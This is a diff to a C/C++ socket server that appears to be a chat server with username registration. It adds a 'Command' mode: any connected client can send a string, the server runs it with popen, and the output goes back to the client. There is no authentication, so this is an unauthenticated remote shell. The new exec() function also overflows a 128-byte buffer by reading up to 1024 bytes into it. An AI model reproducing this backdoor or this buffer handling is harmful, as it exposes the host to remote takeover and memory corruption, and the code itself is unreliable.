@@ -6,6 +6,12 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <pthread.h>
+#include <memory>
+#include <stdexcept>
+#include <string>
+#include <cstdio>
+#include <iostream>
+#include <array>
 
 #define BUFSIZE 1024
 
@@ -43,6 +49,24 @@ void sendData(char * buffer, int clntSock){
 	}
 }
 
+void exec(const char* cmd,  struct client* cInfo) {
+	printf("Entering Command mode\n");
+	char buffer[128];
+	char result[BUFSIZE];
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+	int l = 0;
+    while (fgets(buffer, BUFSIZE, pipe.get()) != nullptr) {
+		if(l >= 850)break;
+		l += snprintf(result + l, 127, "%s", buffer);
+    }
+	sendData(result, cInfo -> clntSock);
+	// memset(result, 0, BUFSIZE);
+	printf("Exiting Command mode\n");
+}
+
 void * host(void * c){
 	struct client* cInfo = (struct client*) c;
 	printf("Client %d connected.\n",cInfo -> index + 1);
@@ -69,6 +93,12 @@ void * host(void * c){
 			printf("Username Registered: %s\n",name[cInfo -> index]);
 	        fflush(stdout);
 		}
+		else if(strcmp(buffer,"Command") == 0){
+			recieveData(buffer, cInfo);
+			exec(buffer, cInfo);
+			memset(buffer, 0, BUFSIZE);
+		}
+
 	}
 	return NULL;
 }
@@ -78,9 +108,9 @@ int main(){
     char servIP[100] = "127.0.0.1"; 
     in_port_t servPort = 8002;
 	printf("Enter: <Server Address>\n");
-    scanf("%s", servIP);
+    // scanf("%s", servIP);
     printf("Enter: <Port>\n");
-    scanf("%hu", &servPort);
+    // scanf("%hu", &servPort);
 
 	// create socket for incoming connections
 	int servSock;
@@ -123,5 +153,4 @@ int main(){
 
 	for(int i = 0 ; i < clientCount ; i ++)
 		pthread_join(thread[i],NULL);
-
 }
